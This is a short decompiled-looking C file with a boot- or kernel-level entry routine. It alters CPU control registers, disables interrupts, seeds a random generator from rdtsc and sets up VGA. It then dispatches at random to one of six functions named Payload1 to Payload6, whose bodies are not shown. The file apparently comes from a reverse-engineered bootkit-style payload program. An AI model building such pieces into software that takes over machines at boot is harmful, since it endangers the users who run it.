
#include "inc.h"


int g_Seed = 0;
unsigned int seed( )
{
	unsigned int v0;
	unsigned int result;

	v0 = g_Seed ^ ( g_Seed << 13 ) ^ ( ( g_Seed ^ ( unsigned int )( g_Seed << 13 ) ) >> 17 );
	result = v0 ^ ( 32 * v0 );
	g_Seed = v0 ^ ( 32 * v0 );
	return result;
}


int KeMain( )
{

	unsigned __int32 v2; // eax
	unsigned __int32 v3; // eax
	unsigned short *v4; // ecx
	void **Exceptions; // edx
	__int16 v6; // ax
	unsigned __int64 v7; // rax
	unsigned int v8; // ecx
	unsigned __int64 v9; // rax
	unsigned int v10; // eax
	unsigned long result; // eax
	int v12; // edx
	unsigned __int64 v13; // rtt
	int v14; // edx
	int v15; // edx
	int v16; // edx
	int v17; // edx


	v2 = __readcr0( );
	__writecr0( v2 & 0x9FFFFFFB | 2 );

	// enable cpu float point
	v3 = __readcr4( );
	__writecr4( v3 | 0x600 );


	_disable( );


	// seed using rdtsc
	v7 = __rdtsc( );
	g_Seed = 0xFFFF * ~v7;
	v8 = seed( );
	v9 = __rdtsc( );
	g_Seed += ~v8 ^ ( 0xFFFF * v9 ) | seed( );
	g_Seed |= seed( );

	SetupVga( );


	// Payload manager
	seed( );
	v10 = seed( );
	v13 = v10;
	result = v10 / 6;
	v12 = v13 % 6;
	if ( !v12 )
		Payload1( );
	v14 = v12 - 1;
	if ( !v14 )
		Payload2( );
	v15 = v14 - 1;
	if ( !v15 )
		Payload3( );
	v16 = v15 - 1;
	if ( !v16 )
		Payload4( );
	v17 = v16 - 1;
	if ( !v17 )
		Payload5( );
	if ( v17 == 1 )
		Payload6( );
	return result;
}